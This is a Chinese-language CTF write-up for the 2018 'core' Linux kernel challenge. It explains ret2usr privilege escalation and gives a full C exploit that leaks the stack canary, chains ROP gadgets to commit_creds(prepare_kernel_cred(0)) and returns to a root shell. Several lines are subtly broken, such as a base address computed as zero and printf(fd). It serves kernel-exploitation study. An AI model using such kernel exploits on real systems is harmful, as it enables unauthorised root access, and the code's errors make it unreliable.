# Items
由于题目分析与ROP中的为同一题，所以思路我这儿不细讲了，这里给出思路地址
> [core利用ROP](../../ROP_kernel/2018_core/writeup.md)
   
ret2usr 攻击利用了 用户空间的进程不能访问内核空间，但内核空间能访问用户空间 这个特性来定向内核代码或数据流指向用户控件，以 ring 0 特权执行用户空间代码完成提权等操作。
## 0x00 ret2user(no SMEP/SMAP)
ret2usr 攻击利用了 用户空间的进程不能访问内核空间，但内核空间能访问用户空间 这个特性来定向内核代码或数据流指向用户控件，以 ring 0 特权执行用户空间代码完成提权等操作。
我这里的自我理解那就是，在用户态定义了函数调用，然后我们在内核态的时候通过ROP等手法时期直接执行在用户态的代码，这样就实现了在内核态ring0的特权来执行用户代码，实际上还蛮简单的，虽然说这个利用手法在KPTI出现之后很少利用了，但是我毕竟还是刚学，所以还是得了解点的。

---
综上，所以咱们只需要在exp中添加这样一段代码即可：
```
void getRootPrivilige(void){
  void *(*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
  int (*commit_creds_ptr)(void *) = commit_creds;
  (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}
```
这里也就是在咱们获得这俩兄弟的地址后在用户程序定义的函数调用，所以咱们只需在ROP中添加这个函数地址使其调用然后通过SWAPGS等系统调用返回用户态即可，以下是成功图！
(是不是很像上此文章的图，兄弟们你们听我狡辩啊不是听我解释，这我真的重新运行的，大伙别说我偷懒)
![](http://imgsrc.baidu.com/super/pic/item/aa64034f78f0f73662139cc34f55b319eac41307.jpg)
1. 通过读取 /tmp/kallsyms 获取 commit_creds 和 prepare_kernel_cred 的方法相同，同时根据这些偏移能确定 gadget 的地址。
2. leak canary 的方法也相同，通过控制全局变量 off 读出 canary。
3. 与 kernel rop 做法不同的是 rop 链的构造:
   > 1. kernel rop 通过 内核空间的 rop 链达到执行 commit_creds(prepare_kernel_cred(0)) 以提权目的，之后通过 swapgs; iretq 等返回到用户态，执行用户空间的 system("/bin/sh") 获取 shell
    > 2. ret2usr 做法中，直接返回到用户空间构造的commit_creds(prepare_kernel_cred(0)) （通过函数指针实现）来提权，虽然这两个函数位于内核空间，但此时我们是 ring 0 特权，因此可以正常运行。之后也是通过 swapgs; iretq 返回到用户态来执行用户空间的 system("/bin/sh")
    

从这两种做法的比较可以体会出之所以要 ret2usr，是因为一般情况下在用户空间构造特定目的的代码要比在内核空间简单得多。（但是据我现在了解最不怕的就是他了(狗头)）
以下是exp：
```
// gcc exp.c -o exp -static -masm=intel -g
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/ioctl.h>

size_t commit_creds = NULL, prepare_kernel_cred = NULL;        // address of to key function
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RDI_RET 0xffffffff81000b2f  
#define POP_RCX_RET 0xffffffff81021e53
#define IRETQ 0xffffffff81050ac2 
size_t user_cs, user_ss,user_rflags,user_sp;

//int fd = 0;        // file pointer of process 'core'

/*void saveStatus();
void get_function_address();
#void core_read(int fd, char* buf);
void change_off(int fd, long long off);
void core_copy_func(int fd, long long nbytes);
void print_binary(char* buf, int length);
void shell();
*/
void saveStatus(){
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          );
  puts("\033[34m\033[1m Status has been saved . \033[0m");
}


void getRootPrivilige(void){
  void *(*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
  int (*commit_creds_ptr)(void *) = commit_creds;
  (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}
void core_read(int fd, char *addr){
  printf("try read\n");
  ioctl(fd,0x6677889B,addr);
  printf("read done!");
}

void change_off(int fd, long long off){
  printf("try set off \n");
  ioctl(fd,0x6677889C,off);
}

void core_copy_func(int fd, long long nbytes){
  puts("try cp\n");
  ioctl(fd,0x6677889A,nbytes);
}

void get_function_address(){
        FILE* sym_table = fopen("/tmp/kallsyms", "r");        // including all address of kernel functions,just like the user model running address.
        if(sym_table == NULL){
                printf("\033[31m\033[1m[x] Error: Cannot open file \"/tmp/kallsyms\"\n\033[0m");
                exit(1);
        }
        size_t addr = 0;
        char type[0x10];
        char func_name[0x50];
        // when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
        while(fscanf(sym_table, "%llx%s%s", &addr, type, func_name)){
                if(commit_creds && prepare_kernel_cred)                // two addresses of key functions are all found, return directly.
                        return;
                if(!strcmp(func_name, "commit_creds")){                // function "commit_creds" found
                        commit_creds = addr;
                        printf("\033[32m\033[1m[+] Note: Address of function \"commit_creds\" found: \033[0m%#llx\n", commit_creds);
                }else if(!strcmp(func_name, "prepare_kernel_cred")){
                        prepare_kernel_cred = addr;
                        printf("\033[32m\033[1m[+] Note: Address of function \"prepare_kernel_cred\" found: \033[0m%#llx\n", prepare_kernel_cred);
                }
        }
}


void shell(){
        if(getuid()){
                printf("\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m");
                exit(1);
        }
        printf("\033[32m\033[1m[+] Getting the root......\033[0m\n");
        system("/bin/sh");
        exit(0);
}

int main(){
  saveStatus();
  int fd = open("/proc/core",2);              //get the process fd
  if(!fd){
                printf("\033[31m\033[1m[x] Error: Cannot open process \"core\"\n\033[0m");
                exit(1);
        }
  char buffer[0x100] = {0};
        get_function_address();                // get addresses of two key function
  ssize_t vmlinux = commit_creds - commit_creds;            //base address
  printf("vmlinux_base = %x",vmlinux);
  //get canary 
  size_t canary;
  change_off(fd,0x40);
  getchar();
  printf(fd);
  core_read(fd,buffer);
  canary = ((size_t *)buffer)[0];
  printf("canary ==> %p\n",canary);
  //build the ROP
  size_t rop_chain[0x1000] ,i= 0;
  printf("construct the chain\n");
  for(i=0; i< 10 ;i++){
    rop_chain[i] = canary;
  }
  rop_chain[i++] = (size_t)getRootPrivilige; 
  rop_chain[i++] = SWAPGS_POPFQ_RET + vmlinux;
  rop_chain[i++] = 0;
  rop_chain[i++] = IRETQ + vmlinux;
  rop_chain[i++] = (size_t)shell;
  rop_chain[i++] = user_cs;
  rop_chain[i++] = user_rflags;
  rop_chain[i++] = user_sp;
  rop_chain[i++] = user_ss;
  write(fd,rop_chain,0x800);
  core_copy_func(fd,0xffffffffffff0100); 
}
```
